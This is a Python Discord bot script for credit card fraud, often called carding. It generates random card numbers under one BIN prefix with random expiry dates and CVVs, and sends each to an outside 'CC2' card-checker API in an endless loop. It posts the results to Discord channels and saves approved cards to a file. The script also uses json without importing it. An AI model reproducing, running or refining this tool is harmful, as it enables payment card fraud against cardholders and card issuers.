import discord
import aiohttp
import asyncio
import random
import logging
import threading
from flask import Flask
from dotenv import load_dotenv

# Load environment variables
load_dotenv()
TOKEN = "YOUR_DISCORD_BOT_TOKEN"  # Replace with your actual bot token

ALL_CARDS_CHANNEL_ID = 1335890667322216471  # Checked cards channel
SUCCESS_CARDS_CHANNEL_ID = 1338017494128136293  # Approved cards channel

LOG_FILE = "bot_debug.log"

# Flask App Setup (7860 Port)
app = Flask(__name__)

@app.route("/")
def hello_world():
    return "Hello World!"

def run_flask():
    """Flask server ko alag thread me run karega."""
    app.run(host="0.0.0.0", port=7860)

# Intents fix
intents = discord.Intents.default()
intents.messages = True
intents.guilds = True
intents.message_content = True  # Ensure bot can read messages
client = discord.Client(intents=intents)

# Logging setup
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - [%(levelname)s] - %(message)s",
    handlers=[logging.FileHandler(LOG_FILE), logging.StreamHandler()]
)

def generate_card():
    """Generate a random card number using BIN 520806."""
    bin_prefix = "520806"
    random_digits = "".join(str(random.randint(0, 9)) for _ in range(10))
    card_number = bin_prefix + random_digits
    expiry_month = str(random.randint(1, 12)).zfill(2)
    expiry_year = str(random.randint(25, 30))  # Random future year
    cvv = str(random.randint(100, 999))
    return f"{card_number}|{expiry_month}|20{expiry_year}|{cvv}"

async def check_card(card):
    """Card ko CC2 API se check karega (No retries)."""
    logging.info(f"🔍 Checking card: {card}")

    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(f"https://cc2.ffloveryt.in/api?card={card}", timeout=10) as response:
                if response.status != 200:
                    logging.warning(f"⚠️ CC2 API Error ({response.status})")
                    return "error", card, f"API Error: {response.status}"

                cc2_data = await response.json()

                # ✅ Check if card is valid
                if cc2_data.get("status").strip().upper() in ["SUCCESS", "APPROVED"]:
                    logging.info(f"✅ Card Approved: {card}")
                    return "success", card, json.dumps({"CC2 Response": cc2_data}, indent=4)

                # ❌ If card is declined
                logging.info(f"❌ Card Declined: {card}")
                return "declined", card, json.dumps({"CC2 Response": cc2_data}, indent=4)

        except Exception as e:
            logging.warning(f"⚠️ API Error: {e}")
            return "error", card, f"API Error: {e}"

async def process_cards():
    """Generate random cards using BIN 520806, check them, and send results to Discord."""
    logging.info("📥 Generating and checking cards...")

    approved_cards = []

    while True:  # Infinite loop to generate and check cards
        card = generate_card()
        status, checked_card, full_response = await check_card(card)

        logging.info(f"🔍 Checked Card: `{checked_card}`\n{full_response}")

        embed = discord.Embed(title="Card Check Result", color=0x00ff00 if status == "success" else 0xff0000)
        embed.add_field(name="Card", value=f"`{checked_card}`", inline=False)
        embed.add_field(name="Status", value=status.upper(), inline=True)
        embed.add_field(name="Response", value=f"```json\n{full_response}\n```", inline=False)

        channel = client.get_channel(ALL_CARDS_CHANNEL_ID)
        if channel:
            await channel.send(embed=embed)

        if status == "success":
            approved_cards.append(checked_card)

        # Save approved cards to approve.txt
        if approved_cards:
            with open("approve.txt", "w") as file:
                file.write("\n".join(approved_cards))

        await asyncio.sleep(5)  # 5-second delay before generating next card

@client.event
async def on_ready():
    logging.info(f'✅ Logged in as {client.user}')
    threading.Thread(target=run_flask).start()  # Flask server start karega
    await process_cards()

client.run(TOKEN)
